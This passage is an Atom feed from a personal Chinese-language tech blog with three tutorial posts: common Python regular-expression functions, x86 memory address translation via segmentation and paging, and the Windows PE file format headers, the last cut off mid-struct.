<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Keven S</title>
  
  <subtitle>名无实，实无名</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://kevens10.github.io/"/>
  <updated>2020-01-17T15:41:47.085Z</updated>
  <id>https://kevens10.github.io/</id>
  
  <author>
    <name>Keven</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>常用的Python正则表达式</title>
    <link href="https://kevens10.github.io/articles/%E5%B8%B8%E7%94%A8%E7%9A%84Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html"/>
    <id>https://kevens10.github.io/articles/%E5%B8%B8%E7%94%A8%E7%9A%84Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html</id>
    <published>2020-01-17T12:48:51.000Z</published>
    <updated>2020-01-17T15:41:47.085Z</updated>
    
    <content type="html"><![CDATA[<p>在写Python爬虫的时候经常要用到正则表达式，今天把比较常用的一些用法总结记录一下<br>首先需要导入re模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br></pre></td></tr></table></figure><h3 id="start-end-和span-函数"><a href="#start-end-和span-函数" class="headerlink" title="start(),end()和span()函数"></a>start(),end()和span()函数</h3><h5 id="start"><a href="#start" class="headerlink" title="start()"></a>start()</h5><p>返回匹配的起始位置。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">re.search(r&apos;\d+&apos;, &apos;asdf13df234&apos;).start()</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>索引位置是从0开始计数的。</p><h5 id="end"><a href="#end" class="headerlink" title="end()"></a>end()</h5><p>返回匹配结束的下一个位置。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">re.search(r&apos;\d+&apos;, &apos;asdf13df234&apos;).end()</span><br><span class="line">6</span><br></pre></td></tr></table></figure><h5 id="span"><a href="#span" class="headerlink" title="span()"></a>span()</h5><p>返回匹配的区间，左闭右开。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">re.search(r&apos;\d+&apos;, &apos;asdf13df234&apos;).span()</span><br><span class="line">(4, 6)</span><br></pre></td></tr></table></figure><h3 id="group-函数"><a href="#group-函数" class="headerlink" title="group()函数"></a>group()函数</h3><p>获得一个或多个分组截获的字符串；指定多个参数时将以元组形式返回。编号0代表匹配的整个子串；默认返回group(0)；没有截获字符串的组返回None；截获了多次的组返回最后一次截获的子串。</p><h3 id="groups-函数"><a href="#groups-函数" class="headerlink" title="groups()函数"></a>groups()函数</h3><p>以元组形式返回全部分组截获的字符串。相当于调用group(1,2,…last)。没有截获字符串的组以默认值None代替。</p><h3 id="re-match函数"><a href="#re-match函数" class="headerlink" title="re.match函数"></a>re.match函数</h3><p>re.match 从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。<br>函数语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(pattern, string, flags=0)</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(re.match(&apos;www&apos;, &apos;www.abc.com&apos;).span())  # 在起始位置匹配</span><br><span class="line">print(re.match(&apos;com&apos;, &apos;www.abc.com&apos;))         # 不在起始位置匹配</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(0, 3)</span><br><span class="line">None</span><br></pre></td></tr></table></figure><h3 id="re-search函数"><a href="#re-search函数" class="headerlink" title="re.search函数"></a>re.search函数</h3><p>re.search 扫描整个字符串并返回第一个成功的匹配。匹配成功re.search方法返回一个匹配的对象，否则返回None。<br>函数语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.search(pattern, string, flags=0)</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(re.search(&apos;www&apos;, &apos;www.abc.com&apos;).span())  # 在起始位置匹配</span><br><span class="line">print(re.search(&apos;com&apos;, &apos;www.abc.com&apos;).span())         # 不在起始位置匹配</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(0, 3)</span><br><span class="line">(8, 11)</span><br><span class="line">``` </span><br><span class="line">![QQ截图20200117162307.jpg](https://i.loli.net/2020/01/17/853v4tXYmCLdo2j.jpg)</span><br><span class="line"></span><br><span class="line">**re.match与re.search的区别</span><br><span class="line">re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。**</span><br><span class="line">### re.sub函数</span><br><span class="line">re.sub用于替换字符串中的匹配项。</span><br><span class="line">语法：</span><br></pre></td></tr></table></figure><p>re.sub(pattern, repl, string, count=0, flags=0)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+ pattern : 正则中的模式字符串。</span><br><span class="line">+ repl : 替换的字符串，也可为一个函数。</span><br><span class="line">+ string : 要被查找替换的原始字符串。</span><br><span class="line">+ count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</span><br><span class="line"></span><br><span class="line">例子;</span><br></pre></td></tr></table></figure><p>a=”0123-456-789”<br>b=re.sub(r’\D’,””,a)<br>print “b”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行结果：</span><br></pre></td></tr></table></figure><p>0123456789</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">### re.compile函数</span><br><span class="line">compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。</span><br><span class="line"></span><br><span class="line">语法格式为：</span><br></pre></td></tr></table></figure><p>re.compile(pattern[, flags])</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例子：</span><br></pre></td></tr></table></figure><p>pattern = re.compile(r’\d+’)                    # 用于匹配至少一个数字</p><blockquote><blockquote><blockquote><p>m = pattern.match(‘one12twothree34four’)        # 查找头部，没有匹配<br>print m<br>None<br>m = pattern.match(‘one12twothree34four’, 2, 10) # 从’e’的位置开始匹配，没有匹配<br>print m<br>None<br>m = pattern.match(‘one12twothree34four’, 3, 10) # 从’1’的位置开始匹配，正好匹配<br>print m                                         # 返回一个 Match 对象<br>&lt;_sre.SRE_Match object at 0x10a42aac0&gt;</p></blockquote></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">### findall函数</span><br><span class="line">在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。</span><br><span class="line">**re.match 和 re.search 是匹配一次 ,而findall 匹配所有。**</span><br><span class="line">例子：</span><br></pre></td></tr></table></figure><p>pattern = re.compile(r’\d+’)   # 查找数字<br>result1 = pattern.findall(‘runoob 123 google 456’)<br>result2 = pattern.findall(‘run88oob123google456’, 0, 10)# 从0开始匹配，到10结束<br>print(result1)<br>print(result2)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行结果：</span><br></pre></td></tr></table></figure><p>[‘123’, ‘456’]<br>[‘88’, ‘12’]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">re.finditer</span><br><span class="line">和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。</span><br><span class="line">### re.split函数</span><br><span class="line">split 方法按照能够匹配的子串将字符串分割后返回列表。</span><br><span class="line">语法：</span><br></pre></td></tr></table></figure><p>re.split(pattern, string[, maxsplit=0, flags=0])</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例子:</span><br></pre></td></tr></table></figure><p>re.split(‘\W+’, ‘runoob, runoob, runoob.’)<br>[‘runoob’, ‘runoob’, ‘runoob’, ‘’]</p><p>re.split(‘(\W+)’, ‘ runoob, runoob, runoob.’)<br>[‘’, ‘ ‘, ‘runoob’, ‘, ‘, ‘runoob’, ‘, ‘, ‘runoob’, ‘.’, ‘’]</p><p>re.split(‘\W+’, ‘ runoob, runoob, runoob.’, 1)<br>[‘’, ‘runoob, runoob, runoob.’]</p><pre><code>### 元字符+ .                    匹配任意字符（不包括换行符）+ ^                    匹配开始位置，多行模式下匹配每一行的开始+ $                    匹配结束位置，多行模式下匹配每一行的结束+ *                  匹配前一个元字符0到多次+ +                   匹配前一个元字符1到多次+ ?                    匹配前一个元字符0到1次+ {m,n}                匹配前一个元字符m到n次+ \\                   转义字符，跟在其后的字符将失去作为特殊元字符的含义，例如\\.只能匹配.，不能再匹配任意字符+ []                   字符集，一个字符的集合，可匹配其中任意一个字符+ |                    逻辑表达式 或 ，比如 a|b 代表可匹配 a 或者 b+ (...)                分组，默认为捕获，即被分组的内容可以被单独取出，默认每个分组有个索引，从 1 开始，按照&quot;(&quot;的顺序决定索引值+ (?iLmsux)            分组中可以设置模式，iLmsux之中的每个字符代表一个模式,用法参见 模式 I+ (?:...)              分组的不捕获模式，计算索引时会跳过这个分组+ (?P&lt;name&gt;...)        分组的命名模式，取此分组中的内容时可以使用索引也可以使用name+ (?P=name)            分组的引用模式，可在同一个正则表达式用引用前面命名过的正则+ (?#...)              注释，不影响正则表达式其它部分,用法参见 模式 I+ (?=...)              顺序肯定环视，表示所在位置右侧能够匹配括号内正则+ (?!...)              顺序否定环视，表示所在位置右侧不能匹配括号内正则+ (?&lt;=...)             逆序肯定环视，表示所在位置左侧能够匹配括号内正则+ (?&lt;!...)             逆序否定环视，表示所在位置左侧不能匹配括号内正则+ (?(id/name)yes|no)   若前面指定id或name的分区匹配成功则执行yes处的正则，否则执行no处的正则+ \number              匹配和前面索引为number的分组捕获到的内容一样的字符串+ \A                   匹配字符串开始位置，忽略多行模式+ \Z                   匹配字符串结束位置，忽略多行模式+ \b                   匹配位于单词开始或结束位置的空字符串+ \B                   匹配不位于单词开始或结束位置的空字符串+ \d                   匹配一个数字， 相当于 [0-9]\D                   匹配非数字,相当于 [^0-9]+ \s                   匹配任意空白字符， 相当于 [ \t\n\r\f\v]+ \S                   匹配非空白字符，相当于 [^ \t\n\r\f\v]+ \w                   匹配数字、字母、下划线中任意一个字符， 相当于 [a-zA-Z0-9_]+ \W                   匹配非数字、字母、下划线中的任意字符，相当于 [^a-zA-Z0-9_]</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在写Python爬虫的时候经常要用到正则表达式，今天把比较常用的一些用法总结记录一下&lt;br&gt;首先需要导入re模块&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
    
      <category term="Python" scheme="https://kevens10.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://kevens10.github.io/tags/Python/"/>
    
      <category term="正则表达式" scheme="https://kevens10.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>x86内存地址转换</title>
    <link href="https://kevens10.github.io/articles/x86%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2.html"/>
    <id>https://kevens10.github.io/articles/x86%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2.html</id>
    <published>2019-12-07T08:12:16.000Z</published>
    <updated>2019-12-08T06:55:55.364Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-物理地址概念"><a href="#0x00-物理地址概念" class="headerlink" title="0x00 物理地址概念"></a>0x00 物理地址概念</h2><p>用于内存芯片级的单元寻址，与处理器和CPU连接的地址总线相对应。物理地址是明确的、最终用在总线上的编号。</p><h2 id="0x01-逻辑地址概念"><a href="#0x01-逻辑地址概念" class="headerlink" title="0x01 逻辑地址概念"></a>0x01 逻辑地址概念</h2><p>逻辑地址指的是机器语言指令中，用来指定一个操作数或者是一条指令的地址。写汇编代码时，让CPU直接访问内存，这里所说的内存实际上就是逻辑地址。实际上用户层是不能直接访问物理内存的，只有内核级权限才能访问它。</p><p>在x86架构中，每个逻辑地址包括两部分：段（Segment）和偏移量（Offset）。</p><h2 id="0x02-线性地址概念"><a href="#0x02-线性地址概念" class="headerlink" title="0x02 线性地址概念"></a>0x02 线性地址概念</h2><p>也称为<code>虚拟地址</code>。在32位CPU中，它是32位的无符号整型，最大可以达到4G。在x86_64 CPU中目前最大可使用40位地址线，即最大可寻址1TB。</p><h2 id="0x03-CPU与内存映射"><a href="#0x03-CPU与内存映射" class="headerlink" title="0x03 CPU与内存映射"></a>0x03 CPU与内存映射</h2><p>CPU主要通过3种方式与外界交互：内存地址空间，I/O地址空间，还有中断。</p><p>前端总线把CPU与北桥连接起来（北桥则连接RAM内存、各种PCI设备，以及南桥）。每当CPU需要读写内存时，都会使用这条总线。在前端总线上传输的内存地址都是物理内存地址，编号从 0 开始一直到可用物理内存的最高端。这些数字被北桥映射到实际的内存条上。</p><p>在 CPU 内部，程序所使用的是逻辑内存地址，它必须被转换成物理地址后，才能用于实际内存访问。</p><h2 id="0x04-内存地址转换与分段"><a href="#0x04-内存地址转换与分段" class="headerlink" title="0x04 内存地址转换与分段"></a>0x04 内存地址转换与分段</h2><p><img src="https://i.loli.net/2019/12/07/PZ3MGfawsk2I8JB.png" alt="XRg.png"><br>从图中可以看到，<br><strong>CPU先通过分段机制将代码中的逻辑地址翻译成线性地址（虚拟地址），再利用分页机制将线性地址（虚拟地址）翻译成物理地址，交给北桥寻址。</strong></p><p><img src="https://i.loli.net/2019/12/07/q4vPYrCuRpOjEtF.png" alt="QQ截图20191207110557.png"><br>对于每一个进程，系统分配4GB的虚拟内存（不管物理内存实际有多大），其中0X00000000至0X7FFFFFFF为用户进程空间，0X80000000至0XFFFFFFFF为系统空间，每一个进程都拥有这么个4G的虚拟地址地址空间。</p><p>用户区是每个进程真正独立的可用内存空间，进程中的绝大部分数据都保存在这一区域。<br>主要包括：应用程序代码、全局变量、所有线程的线程栈以及 加载的DLL代码等<br>每个进程的用户区的虚拟内存空间相互独立，一般不可以直接跨进程访问，这使得一个程序直接破坏另一个程序的可能性非常小。<br>内核区中的所有数据是所用进程共享的，是操作系统代码的驻地。<br>其中包括： 操作系统内核代码， 以及与线程调度、 内存管理、文件系统支持、网络支持、 设备驱动程序相关的代码。<br>该分区中所有代码和数据都被操作系统保护。用户模式代码无法直接访问和操作：如果应用程序直接对该内存空间内的地址访问，将会发生地址访问违规。</p><p><strong>分段技术把虚拟地址空间映射到了物理地址空间，并且程序操作的是虚拟地址。</strong><br>将用户程序地址空间分成若干个大小不等的段，每段可以定义一组相对完整的逻辑信息。每个段都从0开始编址，并采用一段连续的地址空间。<br>段的长度由相应的逻辑信息组的长度决定，因而各段长度不等。整个作业的地址空间是二维的。</p><p>段号4位，每个作业最多2的4次方=16段，表示段号从0000至1111；段内位移量12位，2的12次方=4k，表示每段的段内地址最大为4K（各段长度不同），从000000000000至111111111111</p><p>3段表示例：<br>段号 段长 起始地址 存取控制<br>0     1K     4096    </p><p>1     4K     17500    </p><p>2     2K     8192  </p><p>分页技术仍然是一种虚拟地址空间到物理地址空间映射的机制。但是，粒度更加的小了。单位不是整个程序，而是某个“页”，一段虚拟地址空间组成的某一页映射到一段物理地址空间组成的某一页。<br>页号4位，每个作业最多2的4次方=16页，表示页号从0000至1111（24-1），页内位移量的位数表示页的大小，若页内位移量12位，则2的12次方=4k，页的大小为4k，页内地址从000000000000至111111111111</p><p>CPU在对内存进行操作时，内存管理单元MMU会将虚拟内存映射到物理内存上，所以出现的情况是虚拟内存的连续空间在实际的物理内存上并不一定连续，那么就需要一张表来记录虚拟内存与物理内存之间的映射关系，这就是分页技术中的页表。由于内存太大，页表可能会很大，为便于查找就把它再细分下，相邻的为一组，再加个组索引即有了两张页表了，第一张表来查属于哪一组的，再到那一组去查找更具体的。因此，X86采用二级页表的方式<br><img src="https://i.loli.net/2019/12/08/362oTUbJ9mVyvFg.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-物理地址概念&quot;&gt;&lt;a href=&quot;#0x00-物理地址概念&quot; class=&quot;headerlink&quot; title=&quot;0x00 物理地址概念&quot;&gt;&lt;/a&gt;0x00 物理地址概念&lt;/h2&gt;&lt;p&gt;用于内存芯片级的单元寻址，与处理器和CPU连接的地址总线相对应。物理
      
    
    </summary>
    
    
      <category term="操作系统" scheme="https://kevens10.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="https://kevens10.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="分页存储" scheme="https://kevens10.github.io/tags/%E5%88%86%E9%A1%B5%E5%AD%98%E5%82%A8/"/>
    
      <category term="分段存储" scheme="https://kevens10.github.io/tags/%E5%88%86%E6%AE%B5%E5%AD%98%E5%82%A8/"/>
    
  </entry>
  
  <entry>
    <title>PE文件格式</title>
    <link href="https://kevens10.github.io/articles/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.html"/>
    <id>https://kevens10.github.io/articles/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.html</id>
    <published>2019-11-30T08:12:16.000Z</published>
    <updated>2019-12-02T07:25:01.473Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>Portable Executable（可移植的执行体）是目前Windows平台上主流的可执行文件格式，exe、dll、sys等都是PE文件。<br>PE文件是指32位的可执行文件,也称PE32。64位的可执行文件称为PE+或PE32+，是PE32的一种扩展.</p><h2 id="0x01-相关概念"><a href="#0x01-相关概念" class="headerlink" title="0x01 相关概念"></a>0x01 相关概念</h2><ul><li>虚拟内存地址（Virtual Address, VA）PE文件中的指令被装入内存后的地址</li><li>相对虚拟内存地址（Reverse Virtual Address, RVA相对虚拟地址是内存地址相对于映射基址的偏移量。相对于PE文件装入地址的偏移位置，它是一个“相对地址”。例如，假设一个PE文件从地址400000h处装入，并且它的代码节开始于401000h，代码节的RVA将是：目标地址401000h - 装入地址400000h = RVA 1000h。）</li><li>装载基址（Image Base）：PE文件装入内存的 基地址。默认情况下，EXE文件的基址为0x00400000，DLL文件的基址为0x10000000。</li><li>文件偏移地址（File Offset Address, FOA）数据在PE文件中的地址叫文件偏移地址，这是文件在磁盘上存放时相对于文件开头的偏移。</li><li>内存中数据节相对于装载基址的偏移量和文件中数据节的偏移量的差异称为节偏移。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">虚拟内存地址（VA） = 基地址（Image Base） + 相对虚拟地址（RVA）。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文件偏移地址 = 虚拟内存地址（VA） - 装载基址（Image Base） - 节偏移 </span><br><span class="line">             = RVA - 节偏移</span><br></pre></td></tr></table></figure><p> <img src="https://i.loli.net/2019/11/30/YQICNV3LFhrlyu9.png" alt="PE1.png"></p><hr><p>下面简单介绍PE文件的构成：</p><h2 id="0x02-DOS头"><a href="#0x02-DOS头" class="headerlink" title="0x02 DOS头"></a>0x02 DOS头</h2><p>PE文件的第一个字节起始于MS-DOS头部，称作 IMAGE_DOS_HEADER。微软为了考虑DOS兼容性的问题，在PE 头的最前边添加了一个 IMAGE_DOS_HEADER 结构体，用来扩展已有的DOS EXE。Dos结构体的大小为40个字节。结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_DOS_HEADER &#123;      // DOS .EXE header</span><br><span class="line">WORD   e_magic;                // +0000h   -   EXE标志，“MZ”</span><br><span class="line">    WORD   e_cblp;                 // +0002h   -   最后（部分）页中的字节数</span><br><span class="line">    WORD   e_cp;                   // +0004h   -   文件中的全部和部分页数</span><br><span class="line">    WORD   e_crlc;                 // +0006h   -   重定位表中的指针数</span><br><span class="line">    WORD   e_cparhdr;              // +0008h   -   头部尺寸，以段落为单位</span><br><span class="line">    WORD   e_minalloc;             // +000ah   -   所需的最小附加段</span><br><span class="line">    WORD   e_maxalloc;             // +000ch   -   所需的最大附加段</span><br><span class="line">    WORD   e_ss;                   // +000eh   -   初始的SS值（相对偏移量）</span><br><span class="line">    WORD   e_sp;                   // +0010h   -   初始的SP值</span><br><span class="line">    WORD   e_csum;                 // +0012h   -   补码校验值</span><br><span class="line">    WORD   e_ip;                   // +0014h   -   初始的IP值</span><br><span class="line">    WORD   e_cs;                   // +0016h   -   初始的CS值</span><br><span class="line">    WORD   e_lfarlc;               // +0018h   -   重定位表的字节偏移量</span><br><span class="line">    WORD   e_ovno;                 // +001ah   -   覆盖号</span><br><span class="line">    WORD   e_res[4];               // +001ch   -   保留字00</span><br><span class="line">    WORD   e_oemid;                // +0024h   -   OEM标识符</span><br><span class="line">    WORD   e_oeminfo;              // +0026h   -   OEM信息</span><br><span class="line">    WORD   e_res2[10];             // +0028h   -   保留字</span><br><span class="line">    LONG   e_lfanew;               // +003ch   -   PE头相对于文件的偏移地址</span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>这一部分主要是当初为兼容DOS设计，主要看最后一个字段，指示PE头的位置。</p><h4 id="DOS存根"><a href="#DOS存根" class="headerlink" title="DOS存根"></a>DOS存根</h4><p>DOS头的下面是DOS存根。DOS存根（stub）为可选，在dos下会运行并结束程序，大小也任意。大小为NT头的偏移量减去DOS头的40个字节。整个DOS Stub是一个字节块，其内容随着链接时使用的链接器不同而不同，PE中并没有与之对应的相关结构。</p><h2 id="0x03-PE头"><a href="#0x03-PE头" class="headerlink" title="0x03 PE头"></a>0x03 PE头</h2><p>DOS stub后面的是PE头标识Signature。与大部分文件格式的头部结构一样，PE头部信息中有一个四字节的标识，其内容固定，对应的ASCII码的字符串是“PE00”。</p><h3 id="PE头IMAGE-NT-HEADERS"><a href="#PE头IMAGE-NT-HEADERS" class="headerlink" title="PE头IMAGE_NT_HEADERS"></a>PE头IMAGE_NT_HEADERS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_NT_HEADERS &#123;</span><br><span class="line">   DWORD Signature;                      // +0000h   -   PE文件标识，“PE00”</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;                   // +0004h   -   PE标准头</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;         // +0018h   -   PE扩展头</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><h3 id="标准PE头IMAGE-FILE-HEADER"><a href="#标准PE头IMAGE-FILE-HEADER" class="headerlink" title="标准PE头IMAGE_FILE_HEADER"></a>标准PE头IMAGE_FILE_HEADER</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_FILE_HEADER &#123;</span><br><span class="line">    WORD    Machine;                             // +0004h   -   运行平台</span><br><span class="line">    WORD    NumberOfSections;                    // +0006h   -   PE中节的数量</span><br><span class="line">    DWORD   TimeDateStamp;                       // +0008h   -   文件创建日期和时间</span><br><span class="line">    DWORD   PointerToSymbolTable;                // +000ch   -   指向符号表</span><br><span class="line">    DWORD   NumberOfSymbols;                     // +0010h   -   符号表中的符号数量</span><br><span class="line">    WORD    SizeOfOptionalHeader;                // +0014h   -   扩展头结构的长度</span><br><span class="line">    WORD    Characteristics;                     // +0016h   -   PE的属性</span><br><span class="line"></span><br><span class="line">&#125;IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><p>PE属性可为下面的值:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#define IMAGE_FILE_RELOCS_STRIPPED 0x0001//文件中不包含重定位信息</span><br><span class="line">#define IMAGE_FILE_EXECUTABLE_IMAGE 0x0002//文件可执行</span><br><span class="line">#define IMAGE_FILE_LINE_NUMS_STRIPPED 0x004//不包含行号</span><br><span class="line">#define IMAGE_FILE_LOCAL_SYMS_STRIPPED 0x0008//不包含符号</span><br><span class="line">#define IMAGE_FILE_AGGRESIVE_WS_TRIM 0x0010//强制缩减工作组</span><br><span class="line">#define IMAGE FILE LARGE ADDRESS AWARE 0x0020//能处理超过2GB范围的地址</span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_LO 0x0080//字节序颠倒的</span><br><span class="line">#define IMAGE FILE 32BIT MACHINE 0x0100//运行于32位平台</span><br><span class="line">#define IMAGE_FILE_DEBUG_STRIPPED 0x0200//不包含调试</span><br><span class="line">#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP 0x0400//如果文件在移动介质中则在交换曲运行</span><br><span class="line">#define IMAGE_FILE_NET_RUN_FROM_SWAP 0x0800//如果映像在网络则复制到交换曲运行</span><br><span class="line">#define IMAGE_FILE_SYSTEM 0x1000//是系统文件.</span><br><span class="line">#define IMAGE FILE_DLL 0x2000//是DLL文件.</span><br><span class="line">#define IMAGE_FILE_UP_SYSTEM_ONLY 0x4000//只能在单处理器上运行</span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_HI 0x8000//字节时颠倒的</span><br></pre></td></tr></table></figure><h3 id="扩展PE头IMAGE-OPTIONAL-HEADER"><a href="#扩展PE头IMAGE-OPTIONAL-HEADER" class="headerlink" title="扩展PE头IMAGE_OPTIONAL_HEADER"></a>扩展PE头IMAGE_OPTIONAL_HEADER</h3><p>对该结构中的某些数值的随意改动可能会造成PE文件的加载或运行失败。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_OPTIONAL_HEADER &#123;</span><br><span class="line"> WORD    Magic;                                 // +0018h   -   魔术字107h = ROM Image，10bh = exe Image</span><br><span class="line">    BYTE    MajorLinkerVersion;                    // +001ah   -   链接器版本号</span><br><span class="line">    BYTE    MinorLinkerVersion;                    // +001bh   -   </span><br><span class="line">    DWORD   SizeOfCode;                            // 